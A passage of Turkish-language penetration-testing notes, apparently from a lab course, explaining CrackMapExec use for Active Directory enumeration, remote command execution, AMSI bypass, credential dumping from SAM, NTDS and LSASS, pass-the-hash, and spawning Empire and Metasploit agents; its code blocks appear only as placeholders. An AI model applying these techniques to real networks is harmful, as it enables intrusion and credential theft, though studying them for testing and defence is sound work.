| `crackmapexec ldap <hedef> -u <kullanıcı> -p <şifre> --password-notrequired`   | `PASSWORD_NOTREQD` bayrağı olan kullanıcıları listeler.                                            |
| `crackmapexec ldap <hedef> -u <kullanıcı> -p <şifre> --trusted-for-delegation` | `TRUSTED_FOR_DELEGATION` bayrağı olan kullanıcı ve bilgisyalarını listeler.                        |
| `crackmapexec ldap <hedef> -u <kullanıcı> -p <şifre> --admin-count`            | `adminCount=1` derecesine sahip objeleri listeler.                                                 |
| `crackmapexec ldap <hedef> -u <kullanıcı> -p <şifre> --get-sid`                | Domainin SID bilgisini alır.                                                                       |
| `crackmapexec ldap <hedef> -u <kullanıcı> -p <şifre> --gmsa`                   | GMSA (Gruplandırılmış Yönetici Hizmet Hesapları) şifrelerini listeler.                             |
| `crackmapexec rdp <hedef> -u <kullanıcı> -p <şifre> --nla-screenshot`          | NLA (Ağ Seviyesinde Kimlik Doğrulaması) devre dışı ise RDP giriş ekranının ekran görüntüsünü alır. |
| `crackmapexec rdp <hedef> -u <kullanıcı> -p <şifre> --screenshot`              | Bağlantı başarılıysa RDP oturumunun ekran görüntüsünü alır.                                        |
| `crackmapexec rdp <hedef> -u <kullanıcı> -p <şifre> --screentime`              | Masaüstü görüntüsü için bekleme süresini belirtir.                                                 |
| `crackmapexec rdp <hedef> -u <kullanıcı> -p <şifre> --res RES`                 | Çözünürlük belirler (örnek format: WIDTHxHEIGHT, varsayılan: 1024x768).                            |

Henüz çalışmadıklarımız varsa onları gözden geçirelim.

### Enumerating Users and Groups

SMB protokolünde yaptığımız gibi, `LDAP` ile de kullanıcıları ve grupları listeleyebiliriz:

### Enumerating Users and Groups

{{CODE_BLOCK_137}}

Not: Domain FQDN'sini çözümleyemezsek LDAP protokol iletişimlerinin çalışmayacağını unutmayın. Domain DNS sunucularına bağlanmıyorsak, FQDN'yi `/etc/hosts` dosyasında yapılandırmamız gerekir


### İlginç Hesap Özelliklerini Numaralandırma

`ldap` protokolü, `PASSWD_NOTREQD` veya `TRUSTED_FOR_DELEGATION` bayrağı ile hesapları tanımlamamıza yardımcı olacak birkaç seçeneğe daha sahiptir ve hatta `adminCount` değeri `1` olan tüm hesapları sorgulayabiliriz.

`PASSWD_NOTREQD` hesap denetimi attribute ayarlanmışsa, kullanıcı geçerli password policy uzunluğuna tabi değildir, yani daha kısa bir parolaya sahip olabilir veya hiç parola kullanmayabilir (domain'de boş parolalara izin veriliyorsa). Bu hesapları tanımlamak için  `--password-notrequired` seçeneğini kullanabiliriz.


### PASSWD_NOTREQD Attribute Tanımlanması

{{CODE_BLOCK_138}}

`TRUSTED_FOR_DELEGATION` attribute ayarlanırsa, bir servisin altında çalıştığı servis hesabı (kullanıcı veya bilgisayar) Kerberos yetkilendirmesi için güvenilirdir, yani servisi talep eden bir client'i taklit edebilir. Bu saldırı türüne `Kerberos Unconstrained Delegation` adı verilir. Bu konu hakkında daha fazla bilgi edinmek için bu [blog](https://adsecurity.org/?p=1667) yazısını okuyabilirsiniz.

### Unconstrained Delegation Belirlenmesi

{{CODE_BLOCK_139}}

`AdminCount` attribute, SDProp process'in bir kullanıcıyı koruyup korumadığını belirler. Bu process'te, Active Directory'deki `AdminSDHolder`, korunan user account'lar için ACL permissions'ın bir template'i olarak görev yapar. Eğer herhangi bir account ACE'si (örneğin, bir attacker tarafından) modified edilirse, bu process tarafından korunan account'ların ACL permissions'ı, `SDProp` process her çalıştığında (default olarak her 60 dakikada bir çalışır, ancak bu süre modified edilebilir) templated permission set'e resetlenir. User, adminCount değeri 0 olarak set edilmişse veya specified değilse bu koruma kapsamına girmez. Eğer attribute value 1 olarak set edilmişse, user korunur. Attacker'lar genellikle internal environment'ta adminCount attribute'i 1 olan account'ları target olarak arar. Bunlar genellikle privileged account'lardır ve further access veya full domain compromise ile sonuçlanabilir.


### adminCount Attribute'u Sorgulama

{{CODE_BLOCK_140}}


### Domain SID'sini numaralandırma

Bazı domain attack'ları, bir user veya domain SID gibi belirli domain bilgilerini elde etmemizi gerektirir. SID (Security IDentifier), bir computer veya domain controller'ın sizi tanımlamak için kullandığı `unique bir ID` numarasıdır. Domain SID ise domain'i tanımlayan unique bir ID numarasıdır. CrackMapExec kullanarak domain SID'i elde etmek için `--get-sid` flag'ini kullanabiliriz:

### Domain SID'i Toplama

{{CODE_BLOCK_141}}


### Group Managed Service Accounts (gMSA)

Bağımsız Yönetilen Hizmet Hesabı (standalone Managed Service Account) (sMSA), aşağıdakileri sağlayan yönetilen bir domain hesabıdır:

* Otomatik parola yönetimi.
* Basitleştirilmiş service principal name (SPN) yönetimi.
* Yönetimi diğer yöneticilere devretme yeteneği

Bu yönetilen servis hesabı (MSA) türü Windows Server 2008 R2 ve Windows 7'de tanıtılmıştır.

Group Managed Service Account (gMSA) domain içinde aynı işlevselliği sağlar ancak aynı zamanda bu işlevselliği birden fazla sunucuya genişletir.

Bir gMSA hesabının parolasını okuma ayrıcalıklarına sahip bir hesabı belirlemek için PowerShell'i kullanabiliriz (komut yürütmeyi bir sonraki bölümde daha ayrıntılı olarak ele alacağız):

### Enumerating Accounts with gMSA Privileges

{{CODE_BLOCK_142}}


Yukarıdaki örnekte, `engels` kullanıcısının `PrincipalsAllowedToRetrieveManagedPassword` ayrıcalığına sahip olduğunu görebiliriz, bu da `svc_inlaneadm$` gMSA hesabının parolasını okuyabileceği anlamına gelir. gMSA parolasını okuma hakkına sahip bir hesabı tehlikeye atarsak, hesabın `NTLM` parola hash'ini almak için `--gmsa` seçeneğini kullanabiliriz.


### gMSA Parolasını Edinme

{{CODE_BLOCK_143}}

Bu kimlik bilgilerini kullanmak için, hash'ler için -H seçeneğini kullanabiliriz.

### svc_inlaneadm$ Hesabı ile Paylaşılan Klasörleri İnceleme

{{CODE_BLOCK_144}}


---

### RDP Screenshots

RDP protokolü aracılığıyla kullanıcı adlarını numaralandırmak için CrackMapExec'i kullanabiliriz. Hedef makinede RDP'ye yalnızca `NLA` ile izin verme seçeneği devre dışı bırakılmışsa, oturum açma isteminin ekran görüntüsünü almak için `--nlascreenshot` seçeneğini kullanabiliriz


### Enumerate Login Prompt

{{CODE_BLOCK_145}}

Ekran görüntüsünü açmak için MATE'in Eye'ını veya CLI'dan eom'u kullanabiliriz.


### Ekran Görüntüsünü Açmak için MATE'in Eye Kullanma

{{CODE_BLOCK_146}}

![Pasted image 20241202231735.png](/img/user/resimler/Pasted%20image%2020241202231735.png)

Eğer bir kullanıcı adı ve parolamız varsa, `--screenshot` seçeneği ile RDP protokolünü kullanarak da ekran görüntüsü alabiliriz. Bu seçenek `--screentime` ile birleştirilebilir, varsayılan olarak `10`, RDP bağlantısı açıldıktan sonra ekran görüntüsü almak için bekleyeceği süredir. Bu, bir hedef makineye bağlandığımızda ve hedefin masaüstünü yüklemesi 10 saniyeden fazla sürdüğünde kullanışlıdır.

Ekran görüntüsü seçeneğiyle birleştirilebilecek bir diğer seçenek de RDP bağlantısı sırasındaki ekran çözünürlüğüne karşılık gelen `--res` seçeneğidir. Bu seçenek yararlıdır çünkü aktif bir RDP oturumu bulursak, kullanıcının ekranının boyutuna bağlı olarak tüm içeriği görebiliriz veya göremeyiz. Varsayılan olarak bu seçenek `1024x768` olarak ayarlanmıştır


### Screenshot Alma

{{CODE_BLOCK_147}}


Not: `--screentime` ve `--res` isteğe bağlı bayraklardır.

Son olarak, ekran görüntüsünü açmak için MATE'in Eye'ını veya CLI'dan eom'u kullanabiliriz:


### Ekran Görüntüsünü Açmak için MATE'in Gözünü Kullanma

{{CODE_BLOCK_148}}

![Pasted image 20241202232523.png](/img/user/resimler/Pasted%20image%2020241202232523.png)

Bu bölümde, hedeflerimize ulaşmamıza yardımcı olabilecek LDAP ve RDP kullanarak çeşitli numaralandırma seçeneklerini inceledik. Aşağıdaki bölüm, CrackMapExec kullanarak komutların nasıl çalıştırılacağını gözden geçirecektir.


---

### Command Execution

Remote target üzerinde local administrator olarak bir komut çalıştırmaya çalışmadan önce `UAC`'nin varlığını kontrol etmeliyiz. UAC etkinleştirildiğinde, ki bu varsayılan durumdur, yalnızca `RID 500`'e sahip administrator hesabı (varsayılan administrator) remote komutları yürütebilir. Durumun böyle olup olmadığını kontrol etmek için iki registry key vardır:

`HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\LocalAccountTokenFilterPolicy`
`HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\FilterAdministratorToken`

Varsayılan olarak, `LocalAccountTokenFilterPolicy` değeri 0 olarak ayarlanmıştır, yani yalnızca built-in administrator hesabı (RID 500) administration görevlerini gerçekleştirebilir. Local administrator grubunda olsak bile, yalnızca kullanıcımızın RID'si `500` ise remote komutları çalıştırabiliriz. Değer 1 olarak ayarlanırsa tüm administrative hesapları yönetim görevlerini yürütebilir.

Administrator yapılandırabileceği bir diğer ayar da local administrator hesabının (RID 500) remote yönetim görevlerini yerine getirmesini engellemektir. Bu, `FilterAdministratorToken` registry değerini 1 olarak ayarlayarak yapılabilir; bu, built-in administrator hesabının (RID 500) remote administrative tasks (remote yönetim görevleri) gerçekleştiremeyeceği anlamına gelir.


### Administrator Olarak Komut Yürütme

Komutları çalıştırmak ve administrators grubuna kimlerin üye olduğunu görmek için Administrator hesabını kullanalım. Windows komut satırı komutlarını çalıştırmak için `-x` seçeneğini ve ardından çalıştırmak istediğimiz komutu kullanmamız gerekir.


### Bir Komutu Administrator Olarak Çalıştırma

{{CODE_BLOCK_149}}


### RID 500 Olmayan Hesap Olarak Komut Yürütme

Yukarıdaki komutta, `localadmin` local user `Administrators` grubundadır, ancak remote komutu çalıştıramaz:

### Komutu localadmin olarak çalıştırma

{{CODE_BLOCK_150}}

Bu, UAC'nin etkin olduğu anlamına gelir. Eğer durum böyleyse, hesap administrator olsa bile (Pwn3d!) mesajını almayacağız. Bu ayarı geri almak istiyorsak, `LocalAccountTokenFilterPolicy`'yi 1 olarak ayarlayabiliriz.


### LocalAccountTokenFilterPolicy'yi Değiştirme

{{CODE_BLOCK_151}}


{{CODE_BLOCK_152}}


### Domain Hesabı Olarak Komut Yürütme

`LocalAccountTokenFilterPolicy` yalnızca local hesaplar için geçerlidir. Bir domain kullanıcımız varsa ve `administrators` grubunun bir parçasıysa, UAC ayarıyla bile komutu çalıştırabiliriz. Bu senaryoda, `INLANEFREIGHT\robert` hesabı `administrators` `grubunun` bir üyesidir, yani UAC etkin olsa bile komutları yürütebilir.


### Komutu Robert olarak çalıştır

{{CODE_BLOCK_153}}


### SMB ile Komut Yürütme

CME'nin dört (4) farklı komut yürütme yöntemi vardır:

| Komut   | Açıklama                                                                                                                             |
| ------- | ------------------------------------------------------------------------------------------------------------------------------------ |
| wmiexec | WMI (Windows Management Instrumentation) kullanılarak komutlar yürütülür (`diskte dosya oluşturulur`).                               |
| atexec  | Windows `görev zamanlayıcısı` ile bir görev planlayarak komutlar yürütülür (`fileless`, ancak Windows’un en son sürümünde çalışmaz). |
| smbexec | Bir servis oluşturup çalıştırarak komutlar yürütülür (`fileless`, ancak Windows’un en son sürümünde çalışmaz).                       |
| mmcexec | wmiexec yöntemine benzer, ancak komutlar Microsoft Yönetim Konsolu (MMC) aracılığıyla yürütülür.                                     |

Not: Her yöntem her bilgisayarda çalışmayabilir.

Varsayılan olarak, CME biri başarısız olursa farklı bir yürütme yöntemine geçecektir. Komutları aşağıdaki sırayla yürütmeye çalışır:

* 1. wmiexec 2. atexec 3. smbexec 4. mmcexec

CME'yi yalnızca bir yürütme yöntemi kullanmaya zorlamak istiyorsak, örneğin `--exec-method` bayrağını kullanarak hangisini kullanacağımızı belirtebiliriz:


### SMBExec Yöntemi ile Komut Yürütme

{{CODE_BLOCK_154}}

Alternatif olarak, -X seçeneğini kullanarak PowerShell ile komutları çalıştırabiliriz:

### wmiexec aracılığıyla PowerShell Komut Yürütme

{{CODE_BLOCK_155}}


PowerShell seçeneği -X çalıştırıldığında, perde arkasında `CrackMapExec` aşağıdakileri yapacaktır:

* AMSI bypass 
* Obfuscate the payload 
* Execute the payload

### Özel AMSI Bypass Çalıştırma

Bu teknikler `PowerShell` çalıştırılırken algılanabilir. Özel bir AMSI bypass payload'u kullanmak istiyorsak, `--amsi-bypass` seçeneğini ve ardından kullanmak istediğimiz payload'un yolunu kullanabiliriz. Örneğin, [AMSI Bypass Değiştirilmiş Amsi ScanBuffer](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell#modified-amsi-scanbuffer-patch) Yamasını kullanalım. Bunu bir dosyaya kaydedeceğiz ve bu AMSI Bypass'ı bir web sunucusundan belleğe yüklemek için bir PowerShell scripti oluşturacağız. İşte adımlar:

*  “Modified Amsi ScanBuffer Patch” içeren dosyayı indirin


### “Modified Amsi ScanBuffer Patch” ile Bir Dosya Oluşturun

{{CODE_BLOCK_156}}


Payload'u olduğu gibi çalıştırmaya çalışırsak, komut maksimum uzunluk olan 8191 karakteri aşacağı için başarısız olacaktır

### Komut Maksimum Uzunluğu Aşıyor

{{CODE_BLOCK_157}}

* Bu sorunu çözmek için, `shantanukhande-amsi.ps1` dosyasını indiren ve çalıştıran bir PowerShell scripti oluşturalım. Ayrıca scriptimizi barındırmak için bir Python web sunucusu oluşturmamız gerekecek.

### PowerShell Komut Dosyasını Oluşturma ve Barındırma

{{CODE_BLOCK_158}}


Not: Sonuna noktalı virgül (;) eklediğinizden emin olun.

Başka bir terminalden, yeni AMSI bypass payload'umuzu çalıştıralım:

### PowerShell Özel AMSI Bypass Kullanma

{{CODE_BLOCK_159}}


### WinRM Kullanarak Komut Yürütme

WinRM protokolü ile de komutları çalıştırabiliriz. Varsayılan olarak WinRM, HTTP TCP port `5985` ve HTTPS TCP port `5986`'yı dinler. Bu protokolle ilgili özel bir şey, bir kullanıcının komutları yürütmek için `administrator` olmasını gerektirmemesidir. `Administrators` grubunun üyesiysek, `Remote Management Users` grubunun üyesiysek veya oturum yapılandırmasında açık `PowerShell Remoting` izinlerimiz varsa WinRM protokolünü kullanabiliriz.

### Command Execution using WinRM

{{CODE_BLOCK_160}}


### WinRM aracılığıyla PowerShell Komut Yürütme

{{CODE_BLOCK_161}}

### Other PowerShell Options

WinRM komut yürütme ile kullanabileceğimiz çeşitli seçenekler vardır. Bunlardan bazılarını görelim:

| Seçenek           | Açıklama                                                |
| ----------------- | ------------------------------------------------------- |
| --port PORT       | WinRM bağlantısı için özel bir port seçmek.             |
| --ssl             | SSL etkinleştirilmiş WinRM'ye bağlanmak.                |
| --ignore-ssl-cert | SSL ile bağlanırken sertifika doğrulamasını yok saymak. |

Not: WinRM protokolü farklı yürütme yöntemlerini desteklemez.

### SSH Command Execution

CrackMapExec kullanarak Linux veya Windows üzerinde komutları çalıştırmak için SSH protokolünü de kullanabiliriz.

### Command Execution with SSH

{{CODE_BLOCK_162}}

Bir SSH sunucusuyla etkileşime girmenin bir başka yaygın yolu da `public` ve `private` keyleri kullanmaktır. CrackMapExec, `--key-file` seçeneği ile `private key` kullanımını destekler. Anahtarın çalışması için `OPENSSH` formatında olması gerekir.

### Private Key Kullanarak SSH ile Komut Yürütme

{{CODE_BLOCK_163}}

Not: Herhangi bir parola yapılandırılmamışsa, `-p` seçeneğini boş `(“”)` olarak ayarlamalıyız, aksi takdirde bir hata alırız

Bu bölümde, CrackMapExec kullanarak komutları yürütmek için üç farklı protokol keşfettik ve daha önce komutları yürütmek için MSSQL'in nasıl kullanılacağını tartıştık. Yazım sırasında, CrackMapExec komutları yürütmek için diğer dört protokolü desteklemektedir. Bir sonraki bölümde CrackMapExec'in kimlik bilgilerini ayıklamak için nasıl kullanılacağı tartışılacaktır.


### Gizli Bilgileri Bulma ve Kullanma

Parola çıkarma söz konusu olduğunda, CrackMapExec oldukça güçlüdür. On workstation ele geçirdiğimizi ve tümünden kimlik bilgilerini almak için LSASS process'inin belleğini dump istediğimizi düşünelim; CrackMapExec bunu yapabilir.

Bu bölümde, CrackMapExec'in Windows kimlik bilgilerini dump için sunduğu yöntemleri inceleyeceğiz.


### SAM

SAM database, tüm local kullanıcıların kimlik bilgilerini içerir ve birçok administrator local kimlik bilgilerini birden fazla makinede yeniden kullandığı için bunları ele geçirmek kritik öneme sahiptir. `SMB` ve `WinRM` protokolleriyle kullanılabilen `--sam` seçeneğini kullanarak SAM database içeriğini hızlı bir şekilde alabiliriz.

### Dumping SAM

{{CODE_BLOCK_164}}


### NTDS Active Directory Database

Kimlik bilgilerinin alınabileceği bir başka yer de Active Directory veritabanıdır. ntds.dit dosyası, kullanıcı objeleri, gruplar ve grup üyeliği hakkındaki bilgiler de dahil olmak üzere Active Directory verilerini depolayan bir veritabanıdır. Özellikle, dosya aynı zamanda domain'deki tüm kullanıcılar için parola hash'lerini de saklar (ve hatta bazen bir veya daha fazla hesap için [reversible encryption](https://learn.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/store-passwords-using-reversible-encryption) etkinleştirilmişse açık metin parolalarını da saklar). Bir Domain Admin hesabına veya bir replikasyon/DCSync gerçekleştirme ayrıcalıklarına sahip başka bir hesaba erişimimiz varsa, bir Domain Controller'dan hash'leri dökebiliriz

Hash'leri dump etmek için `--ntds` seçeneğini kullanmamız gerekir, aşağıdaki örnekte `robert` kullanıcısı bir Domain Admin değildir, ancak `replikasyon` gerçekleştirme ayrıcalıklarına sahiptir.

### Domain Controller üzerinden NTDS database dump etme

{{CODE_BLOCK_165}}

`--ntds` seçeneğini kullanırken `--user` ve `--enabled` seçeneklerini dahil edebiliriz. Eğer `--user` kullanırsak ayıklamak istediğimiz kullanıcıyı belirtebiliriz. KRBTGT hesabı için hash dump alalım.

### Yalnızca KRBTGT Hesabının Dump Edilmesi

{{CODE_BLOCK_166}}

Eğer `--enabled` olarak belirtirsek, sadece ekranda `etkin` olan kullanıcıları gösterecek ve bize etkin kullanıcıların listesini çıkarma seçeneği sunacaktır.


### Yalnızca Enabled Hesapları Gösterme

{{CODE_BLOCK_167}}


### Secrets (hash'leri) kullanma

Elde ettiğimiz şifreler NTLM hash'leridir. Hash'leri kırmayı deneyebilir veya parolayı kırmadan kullanıcı olarak kimlik doğrulaması yapmak için `Pass the Hash` tekniğini kullanabiliriz. 

CrackMapExec, parola yerine kimlik doğrulama yöntemi olarak bir NTLM hash'i gerektiren `-H` seçeneğine sahiptir:

### Using NTLM Hashes

{{CODE_BLOCK_168}}

NTLM kimlik doğrulaması SMB, WinRM , RDP, LDAP ve MSSQL protokolleri için desteklenir


### LSA Secrets/Cached Credentials

CrackMapExec, remote makineden herhangi bir agent çalıştırmadan hash dump işlemi gerçekleştiren `impacket-secretsdump`'tan alınmış `--lsa` seçeneğiyle birlikte gelir. Bu seçenek, Cached credentials, local machine key list, [Data Protection API (DPAPI)](https://en.wikipedia.org/wiki/Data_Protection_API) keys ve service credentials dahil olmak üzere LSA Secrets'ı dump eder.

`LSA Secrets`, Windows'ta Local Security Authority (LSA) tarafından kullanılan kritik veriler için benzersiz bir korumalı depolama alanıdır. LSA, bir sistemin local security policy'sini yönetmek, denetlemek, kimlik doğrulamak, kullanıcıların sistemde oturumunu açmak, özel verileri depolamak vb. için tasarlanmıştır. Kullanıcıların ve sistemlerin hassas verileri gizli dosyalarda saklanır. [DPAPI](https://en.wikipedia.org/wiki/Data_Protection_API) anahtarları verileri şifrelemek için kullanılır


### LSA'yı inceleyin
{{CODE_BLOCK_169}}


`DCC2$` ile başlayan hash formatı `Domain Cached Credentials 2 (DCC2)`, MS Cache 2'dir. Bu hash'ler, zayıf bir parola belirlenmişse `Hashcat` kullanılarak kırılabilir çünkü bu algoritma `NTLM`'den çok daha güçlüdür. Ayrıca, Domain Cached Credential hash'leri `Pas the Hash` saldırısı için kullanılamaz. Bunları kırmak için, domain ve kullanıcı adını kaldırmamız, `$DCC2$` 'den sonraki değeri almamız ve Hashcat modül 2100'ü kullanmamız gerekir.


### Cracking Hashes

{{CODE_BLOCK_170}}


{{CODE_BLOCK_171}}


### LSASS'tan Secrets elde etme

LSASS prosesinin belleği, Windows parolalarını `açık metin` olarak veya `NTLM` veya `AES256/AES128` gibi diğer hash biçimlerini içerir. Belleği dump etmek, bir domain administrator bulana kadar daha fazla hesap bulmak için etkili bir yol olabilir.

CrackMapExec, LSASS process belleğinin içeriğini dump etmek için çeşitli modüller içerir. Bunlardan bazılarını görelim:

* [Lsassy](https://github.com/login-securite/lsassy) Python aracı, bir dizi host üzerindeki kimlik bilgilerini remote olarak ayıklamak için kullanılır. Bu [blog](https://en.hackndo.com/remote-lsass-dump-passwords/) yazısı nasıl çalıştığını açıklamaktadır. Bu araç, bir LSASS dump'ındaki gerekli baytları remote okumak için `Impacket` projesini ve kimlik bilgilerini çıkarmak için `pypykatz` kullanır.


### Lsassy Module

{{CODE_BLOCK_172}}

* Procdump, LSASS process dump oluşturmak için Sysinternals'tan Microsoft `Procdump`'ı ve kimlik bilgilerini çıkarmak için `pypykatz`'ı kullanır.


### Procdump Module

{{CODE_BLOCK_173}}


* **[HandleKatz](https://github.com/codewhitesec/HandleKatz)** aracı, **LSASS**'e ait kopyalanmış **handle**'ların kullanımını göstererek, aynı **process**'in **gizlenmiş** bir bellek dump'ını oluşturur.


### Handlekatz Module

{{CODE_BLOCK_174}}


* **[Nanodump](https://github.com/helpsystems/nanodump)**, **LSASS process**'inin **minidump**'ını oluşturan esnek bir araçtır. **LSASS**'e bir **handle** açmak tespit edilebileceğinden, **Nanodump** mevcut **handle**'ları arayabilir. Eğer bir **handle** bulunursa, bunu kopyalayıp **minidump** oluşturmak için kullanır. Ancak, böyle bir **handle** bulunacağının garantisi yoktur.

Not : **Handle**, bir **process**'in **dosya, bellek bölgesi veya başka bir kaynak** ile etkileşime geçmesini sağlayan **benzersiz bir tanımlayıcıdır**.

### Nanodump Module

{{CODE_BLOCK_175}}

Bu bölümde bir bilgisayardan veya domain'den kimlik bilgilerini almak için farklı yöntemler gösterilmektedir. Bir sonraki bölümde CrackMapExec'in bir C2 framework ile birlikte kullanımı incelenecektir.

---


### Bir **C2 Framework** içinde **session**'ları alma.

CrackMapExec ile ilginç olabilecek bir şey, birden fazla hedefi tehlikeye attığımızda, daha fazla recon yapmak veya `Empire` veya `Metasploit` gibi bir C2 Framework kullanarak çalışmak isteyebiliriz. Her hedef makinede bir payload çalıştırmak ve C2'mize bir `agent` almak için CrackMapExec'i kullanabiliriz.

Bu bölümde CME'yi PowerShell Empire ve Metasploit framework ile entegre eden iki modül ele alınacaktır. Ayrıca farklı bir C2 framework'ü kullanırsak bir alternatif de keşfedeceğiz.


### Empire

Web sitelerinde sağlanan [kılavuzu](https://bc-security.gitbook.io/empire-wiki/quickstart/installation) kullanarak [Empire framework](https://github.com/BC-SECURITY/Empire)'ü yükleyerek başlayacağız


### Empire Server'ı Kurun ve Başlatın

{{CODE_BLOCK_176}}

Daha sonra Empire'ı seçtiğimiz kullanıcı adı ve şifre ile çalıştırmamız gerekiyor. Biz `empireadmin` kullanıcı adını ve `asdasd123` şifresini kullanacağız! .


### Empire'ı Özel Kullanıcı Adı ve Parola ile Çalıştırma

{{CODE_BLOCK_177}}

Ardından, CrackMapExec yapılandırma dosyasını ve Empire client yapılandırma dosyasını seçtiğimiz kullanıcı adı ve parolayla eşleşecek şekilde düzenlememiz gerekir.

CrackMapExec yapılandırma dosyası varsayılan olarak `~/.cme/cme.conf` adresinde bulunur. `[Empire]` seçeneğini `empireadmin` kullanıcı adı ve `asdasd123` şifresiyle eşleşecek şekilde değiştirmemiz gerekiyor! . Varsayılan olarak, Empire local server `1337` portunda çalışır. CrackMapExec yapılandırma dosyasında değiştirilebilir.


### CrackMapExec Configuration File

{{CODE_BLOCK_178}}


Aynı şeyi Empire yapılandırma dosyası için de yapmamız gerekiyor. Dosya `empire/client/config.yaml` adresinde bulunur:


### İnceleme

{{CODE_BLOCK_179}}


Yapılandırma dosyaları değiştirildikten sonra, Empire client ile Empire sunucusuna bağlanmalıyız

{{CODE_BLOCK_180}}

Şimdi listener'ı ayarlamamız gerekiyor ve host'u IP adresimize ve Port'u da aracının bağlanacağı TCP 8001'e ayarlayacağız.

### Empire Client Connection

{{CODE_BLOCK_181}}


### Empire Setting up IP and Port

{{CODE_BLOCK_182}}

Artık listener'ımız çalışıyor ve `empire_exec` modülü ile Empire'a bir `agent` almak için CrackMapExec'i kullanabiliriz. Ayarladığımız listener olan `LISTENER=http` seçeneğini eklememiz gerekiyor.


### CrackMapExec Modülünü Kullanma empire_exec

{{CODE_BLOCK_183}}


Bunu çalıştırdığımızda, PowerShell Empire'da yeni bir agent görmeliyiz.

![Pasted image 20241203121035.png](/img/user/resimler/Pasted%20image%2020241203121035.png)


### Metasploit

Aynı şeyi CrackMapExec modülü `web_delivery` kullanarak Metasploit Framework üzerinde de yapabiliriz. Metasploit Framework'te `web_delivery` modülünü yapılandırmamız ve sağlanan URL'yi CrackMapExec modülümüze bir parametre olarak kullanmamız gerekir. Msfconsole'u başlatalım ve `web_delivery` handler'ını yapılandıralım


### Metasploit Configure web_delivery Handler

{{CODE_BLOCK_184}}

Metasploit'te web delivery handler yapılandırıldıktan sonra web_delivery modülünü kullanabiliriz. `URL` ve `PAYLOAD` olmak üzere iki seçeneği destekler. URL seçeneğini Metasploit tarafından sağlanan URL ile ayarlamamız gerekir ve PAYLOAD seçeneği seçtiğimiz payload mimarisine karşılık gelir. Eğer `x64` kullanıyorsak, `x64` varsayılan değer olduğu için bu seçeneği atlayabiliriz ya da `PAYLOAD=64` kullanabiliriz. Eğer `32 bit` payload kullanıyorsak `PAYLOAD=32` seçeneğini ayarlamamız gerekir. Şimdi bunu çalışırken görelim:


### CrackMapExec web_delivery Module

{{CODE_BLOCK_185}}

{{CODE_BLOCK_186}}

Metasploit'te yeni bir oturum görmeliyiz:

![Pasted image 20241203121353.png](/img/user/resimler/Pasted%20image%2020241203121353.png)


### Other C2 Frameworks

Başka bir C2 Framework kullanmak istediğimizde, **Command Execution** bölümünde bahsedilen (SMB, WinRM, SSH) yöntemleri kullanarak aynı sonucu elde edebiliriz. Örneğin, bir **PowerShell** payload'u oluşturabilir, bu payload'u bir web sunucusuna kaydedebilir ve payload'u indirip çalıştırmak için **-X** seçeneğiyle bir PowerShell komutu çalıştırabiliriz. Ayrıca, işlemi arka planda yürütmek için **`--no-output`** seçeneğini seçmemiz gerekecektir.

Örnek olarak Metasploit'i kullanalım ve modülü kullanmak yerine web_delivery payload'unda sağlanan PowerShell script'ini kopyalamayı deneyelim:

![Pasted image 20241203122258.png](/img/user/resimler/Pasted%20image%2020241203122258.png)

Bu bölüm, CrackMapExec'i C2 Frameworks gibi diğer bilgisayar korsanlığı araçlarıyla nasıl kullanabileceğimizi araştırıyor. Bir sonraki bölümde CrackMapExec'in BloodHound ile nasıl entegre edileceği incelenecektir.


---

### Bloodhound Entegrasyonu

BloodHound, hem saldırganlar hem de savunmacılar tarafından alan güvenliğini analiz etmek için kullanılan açık kaynaklı bir araçtır. Araç, domain'den toplanan büyük miktarda veriyi alır. İlişkiyi görsel olarak temsil etmek ve geleneksel numaralandırma ile tespit edilmesi zor veya imkansız olan domain saldırı yollarını belirlemek için grafik teorisini kullanır. Bu bölümde Bloodhound'a aşina olduğunuzu varsayıyoruz. 


### **BloodHound**'da **Owned** olarak işaretleme.

BloodHound'da bir Node'u (user, grup, computer vb.) manuel olarak ele geçirilmiş (owned) olarak işaretleyebiliriz. Bunu yapmak için node'a sağ tıklayıp **`Mark X as Owned`** seçeneğine tıklamamız yeterlidir. Bu, ele geçirdiğimiz kullanıcıları ve bilgisayarları takip etmek açısından faydalıdır, özellikle büyük bir organizasyonla çalışırken. Ayrıca, **`Shortest Path from Owned Principals`** (Ele Geçirilmiş Principal'dan En Kısa Yol) veya **`Shortest Paths to Domain Admins from Owned Principals`** (Ele Geçirilmiş Principal'dan Domain Adminlerine En Kısa Yollar) gibi bir BloodHound cypher sorgusu gerçekleştirmek istediğimizde de kullanışlıdır.

CrackMapExec'i, ele geçirdiğimiz herhangi bir user veya computer'ı BloodHound veritabanında `owned` olarak işaretleyecek şekilde yapılandırabiliriz. Bunu yapmak için, `~/.cme/cme.conf` adresinde bulunan CrackMapExec yapılandırma dosyasını aşağıdaki seçeneklerle değiştirmemiz gerekir:

* Bloodhound yapılandırma seçeneği `bh_enabled`'ı `True` olarak ayarlayın.
* `bh_uri`'yi Bloodhound veritabanı `IP` adresimize ayarlayın.
* `bh_port`'u veritabanı `portuna` ayarlayın
* Kimlik bilgilerini bloodhound veritabanıyla eşleşecek şekilde ayarlayın: kullanıcı adı `neo4j` ve şifre `asdasd123` (Veritabanınıza karşılık geleni kullandığınızdan emin olun).

Yapılandırma aşağıdaki gibi görünmelidir:


### Configuring BloodHound Database

{{CODE_BLOCK_187}}

Not: Bağlandığınız BloodHound veritabanına karşılık gelen kullanıcı adı ve parolayı kullandığınızdan emin olun.

### Bloodhound Verilerinin Toplanması

BloodHound verilerini toplamak için CrackMapExec kullanarak SharpHound'u çalıştıracak ve ardından dosyayı saldırı hostumuza aktaracağız.

### BloodHound verilerinin toplanması

{{CODE_BLOCK_188}}

{{CODE_BLOCK_189}}

{{CODE_BLOCK_190}}

{{CODE_BLOCK_191}}

Şimdi BloodHound'u açmamız ve verileri içe aktarmamız gerekiyor.


### BloodHound'da Kullanıcıları Owned Olarak Ayarlama

Veriler içe aktarıldıktan sonra, `robert` kullanıcısı ile bağlanmaya çalışırsak, kullanıcıyı BloodHound veritabanında owned olunan olarak ayarlayacaktır.

### Kullanıcı BloodHound'da Owned Olarak Eklendi

{{CODE_BLOCK_192}}

Birden fazla kullanıcısı olan bir makineyi tehlikeye atarsak da aynı şey olacaktır. Bulunan tüm yeni kullanıcıları owned olarak ayarlayacaktır.

### Procdump Modülü ile Kullanıcıları Owned Olarak Ekleme

